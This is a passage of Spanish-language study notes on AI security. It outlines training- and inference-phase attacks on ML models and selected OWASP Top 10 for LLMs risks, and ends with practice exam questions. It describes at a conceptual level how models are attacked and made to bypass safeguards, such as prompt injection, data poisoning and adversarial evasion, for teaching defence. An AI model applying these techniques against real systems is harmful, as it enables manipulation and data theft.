  rápido auge de los LLMs como ChatGPT, OWASP ha creado una lista
  específica para los riesgos asociados a estas tecnologías. Esta lista
  incluye vulnerabilidades únicas que no se encuentran en las
  aplicaciones web tradicionales.\[82\]

### 8.2. Ataques Comunes contra Modelos de IA

Los ataques a sistemas de IA pueden ocurrir en la fase de entrenamiento
o en la fase de inferencia (cuando el modelo está en uso).

- **Ataques en la Fase de Entrenamiento:**

  - **Envenenamiento de Datos (Data Poisoning):** El atacante manipula
    los datos de entrenamiento para corromper el modelo, introducir
    sesgos o crear \"puertas traseras\".\[71\] Por ejemplo, introducir
    imágenes de gatos etiquetadas como \"perro\" para sabotear un
    clasificador de imágenes. La mitigación clave es una rigurosa
    validación de la cadena de suministro de datos.

- **Ataques en la Fase de Inferencia:**

  - **Ataques Adversariales de Evasión:** El atacante realiza pequeñas
    modificaciones, a menudo imperceptibles para un humano, en una
    entrada para engañar al modelo y que produzca una salida incorrecta.
    Ejemplo: una pegatina en una señal de \"STOP\" que hace que un coche
    autónomo la interprete como un límite de velocidad.\[72\]

  - **Ataques de Inferencia de Privacidad:** El objetivo es extraer
    información sensible sobre el modelo o sus datos de entrenamiento.

    - **Inferencia de Membresía:** Determinar si un dato específico (ej.
      el registro médico de una persona) formó parte del conjunto de
      entrenamiento.\[73\]

    - **Inversión de Modelo:** Intentar reconstruir los datos de
      entrenamiento originales (ej. una imagen facial) a partir de las
      predicciones del modelo.\[73\]

  - **Robo de Modelo:** El atacante intenta robar un modelo de ML
    propietario, ya sea exfiltrando sus pesos o creando una copia
    funcional interactuando con él a través de su API.

### 8.3. OWASP Top 10 para LLMs (Selección de Riesgos Clave)

1.  **LLM01: Inyección de Prompts (Prompt Injection):** El atacante
    manipula el prompt del LLM para eludir sus filtros de seguridad o
    hacer que realice acciones no deseadas. Es similar a la inyección
    SQL, pero para LLMs.\[82\]

2.  **LLM02: Manejo Inseguro de Salidas (Insecure Output Handling):**
    Ocurre cuando la salida de un LLM se pasa a otro sistema sin una
    sanitización adecuada. Si un LLM genera código JavaScript y este se
    renderiza directamente en una web, puede llevar a XSS.\[82\]

3.  **LLM04: Denegación de Servicio del Modelo (Model Denial of
    Service):** El atacante envía prompts que consumen una cantidad
    desproporcionada de recursos, degradando el servicio para otros
    usuarios e inflando los costos operativos.\[82\]

4.  **LLM06: Fuga de Información Sensible (Sensitive Information
    Disclosure):** El LLM revela accidentalmente información
    confidencial que formaba parte de sus datos de entrenamiento en
    respuesta a los prompts de un usuario.\[82\]

5.  **LLM08: Agencia Excesiva (Excessive Agency):** Se le otorgan al LLM
    demasiados permisos o herramientas para interactuar con otros
    sistemas. Un prompt malicioso podría entonces hacer que el LLM abuse
    de esos permisos (ej. borrar archivos, enviar correos electrónicos
    de phishing).\[82\]

6.  **LLM09: Confianza Excesiva (Overreliance):** Los desarrolladores o
    usuarios confían ciegamente en la salida del LLM sin una revisión
    adecuada, lo que puede llevar a la introducción de código inseguro,
    información incorrecta o decisiones erróneas.\[82\]

### 8.4. Posibles Preguntas y Respuestas del Examen

- **P: ¿Qué es un ataque de envenenamiento de datos en el contexto de
  ML?**

  - R: Es un ataque a la integridad de un modelo de ML donde un atacante
    manipula los datos de entrenamiento para corromper el aprendizaje
    del modelo o crear puertas traseras.\[71\]

- **P: Describa la diferencia entre un ataque de \"inversión de modelo\"
  y un ataque de \"inferencia de membresía\".**

  - R: La inversión de modelo intenta reconstruir los datos de
    entrenamiento originales a partir de las predicciones del modelo. La
    inferencia de membresía tiene un objetivo más simple: solo busca
    determinar si un dato específico estuvo en el conjunto de
    entrenamiento.\[73\]

- **P: ¿Qué es una inyección de prompt (LLM01)?**

  - R: Es un ataque en el que un atacante crea un prompt cuidadosamente
    diseñado para engañar a un LLM y hacer que ignore sus instrucciones
    de seguridad y realice una acción no deseada por sus
    desarrolladores.\[82\]

- **P: Un desarrollador utiliza un LLM para generar código de validación
  de contraseñas y lo implementa sin revisarlo. El código resulta ser
  vulnerable. ¿Qué riesgo del OWASP Top 10 para LLMs se ha
  materializado?**

  - R: LLM09: Confianza Excesiva (Overreliance), porque el desarrollador
    confió en la salida del LLM sin la supervisión y validación humana
    adecuadas.\[82\]
